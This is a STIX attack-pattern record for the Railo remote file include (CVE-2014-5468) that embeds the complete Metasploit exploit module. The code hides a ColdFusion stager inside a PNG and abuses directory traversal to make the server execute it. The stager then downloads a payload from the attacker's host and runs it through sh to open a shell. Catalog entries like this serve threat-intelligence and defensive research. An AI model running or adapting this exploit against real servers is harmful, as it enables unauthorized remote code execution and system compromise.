{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--fc9f725a-7dc9-494d-9ba5-e18af15d982b",
    "created": "2024-08-14T17:01:47.2838Z",
    "modified": "2024-08-14T17:01:47.283804Z",
    "name": "Railo Remote File Include",
    "description": " This module exploits a remote file include vulnerability in Railo tested against version 4.2.1. First, a call using a vulnerable <cffile> line in thumbnail.cfm allows an attacker to download an arbitrary PNG file. By appending a .cfm, and taking advantage of a directory traversal, an attacker can append cold fusion markup to the PNG file, and have it interpreted by the server. This is used to stage and execute a fully-fledged payload. ' 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/railo_cfml_rfi.rb",
            "external_id": "railo_cfml_rfi.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-5468"
        },
        {
            "source_name": "reference",
            "url": "http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(update_info(info,\n                      'Name' => 'Railo Remote File Include',\n                      'Description' => '\n                      This module exploits a remote file include vulnerability in Railo,\n                      tested against version 4.2.1. First, a call using a vulnerable\n                      <cffile> line in thumbnail.cfm allows an attacker to download an\n                      arbitrary PNG file. By appending a .cfm, and taking advantage of\n                      a directory traversal, an attacker can append cold fusion markup\n                      to the PNG file, and have it interpreted by the server. This is\n                      used to stage and execute a fully-fledged payload.\n                                            ',\n                      'License' => MSF_LICENSE,\n                      'Author' => [\n                        'Bryan Alexander <drone@ballastsecurity.net>', # Discovery/PoC\n                        'bperry' # metasploited\n                      ],\n                      'References' => [\n                        ['CVE', '2014-5468'],\n                        ['URL', 'http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/']\n                      ],\n                      'Payload' => {\n                        'Space' => 99999, # if there is disk space, I think we will fit\n                        'BadChars' => \"\",\n                        'DisableNops' => true,\n                        'Compat' => {\n                          'PayloadType' => 'cmd',\n                          'RequiredCmd' => 'generic netcat perl ruby python telnet'\n                        }\n                      },\n                      'Platform' => %w(                      unix                      ),\n                      'Targets' =>\n                      [\n                        [\n                          'Automatic',\n                          {\n                            'Platform' => [ 'unix' ],\n                            'Arch' => ARCH_CMD\n                          }\n                        ]\n                      ],\n                      'DefaultTarget' => 0,\n                      'DisclosureDate' => '2014-08-26'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The base URI of the Railo server', '/railo-context/']),\n        OptInt.new('STAGEWAIT', [true, 'Number of seconds to wait for stager to download', 10])\n      ])\n  end\n\n  def check\n    md5 = '6de48cb72421cfabdce440077a921b25' # /res/images/id.png\n\n    res = send_request_cgi(\n      'uri' => normalize_uri('res', 'images', 'id.png') # the targeturi is not used in this request\n    )\n\n    if !res\n      fail_with(Failure::Unknown, 'Server did not respond')\n    elsif !res.body\n      fail_with(Failure::Unknown, \"Server responded without a body: #{res.code} #{res.message}\")\n    end\n\n    new_md5 = Rex::Text.md5(res.body)\n\n    return Exploit::CheckCode::Appears if new_md5 == md5\n\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if datastore['SRVHOST'] == '0.0.0.0'\n      fail_with(Failure::BadConfig, 'SRVHOST must be an IP address accessible from another computer')\n    end\n\n    url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'].to_s\n\n    @shell_name = Rex::Text.rand_text_alpha(15)\n    stager_name = Rex::Text.rand_text_alpha(15) + '.cfm'\n\n    start_service('Uri' => {\n                    'Proc' => proc do |cli, req|\n                      on_request_stager(cli, req)\n                    end,\n                    'Path' => '/' + stager_name\n                  })\n\n    start_service('Uri' => {\n                    'Proc' => proc do |cli, req|\n                      on_request_shell(cli, req)\n                    end,\n                    'Path' => '/' + @shell_name\n                  })\n\n    wh = '5000' # width and height\n\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', 'thumbnail.cfm'),\n      'vars_get' => {\n        'img' => url + '/' + stager_name,\n        'height' => wh,\n        'width' => wh\n      }\n    )\n\n    if !res\n      fail_with(Failure::Unknown, 'Server did not respond')\n    elsif res.code != 500\n      fail_with(Failure::Unknown, \"Server did not respond with the expected HTTP 500: #{res.code} #{res.message}\")\n    end\n\n    print_status('Waiting for first stage to download...')\n\n    i = datastore['STAGEWAIT']\n    while !@staged && i > 0\n      select(nil, nil, nil, 1)\n      print_status(\"Waiting for #{i} more seconds...\")\n      i = i - 1\n    end\n\n    @staged = false\n\n    if i == 0\n      fail_with(Failure::Unknown, 'Server did not request the stager.')\n    end\n\n    hash = Rex::Text.md5(\"#{url + \"/\" + stager_name}-#{wh}-#{wh}\") # 5000 is width and height from GET\n\n    hash.upcase!\n\n    print_status('Executing stager')\n\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', 'img.cfm'),\n      'vars_get' => {\n        'attributes.src' => '../../../../temp/admin-ext-thumbnails/' + hash,\n        'thistag.executionmode' => 'start'\n      }\n    )\n  end\n\n  def on_request_shell(cli, _request)\n    print_status('Sending payload')\n    send_response(cli, payload.encoded, {})\n    handler(cli)\n  end\n\n  def on_request_stager(cli, _request)\n    url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'].to_s + '/' + @shell_name\n\n    stager = \"<cfhttp method='get' url='#{url}'\"\n    stager << \" path='#GetDirectoryFromPath(GetCurrentTemplatePath())#..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\'\"\n    stager << \" file='#{@shell_name}'>\"\n    stager << \"<cfexecute name='sh' arguments='#{@shell_name}' timeout='99999'></cfexecute>\"\n\n    png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcS'\n    png << 'JAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg=='\n\n    # A very small PNG file\n    png = Rex::Text.decode_base64(png)\n\n    stager.each_byte do |b|\n      png << b\n    end\n\n    png << 0x00\n\n    print_status('Sending stage. This might be sent multiple times.')\n    send_response(cli, png,  'Content-Type' => 'image/png')\n\n    @staged = true\n\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-08-26",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}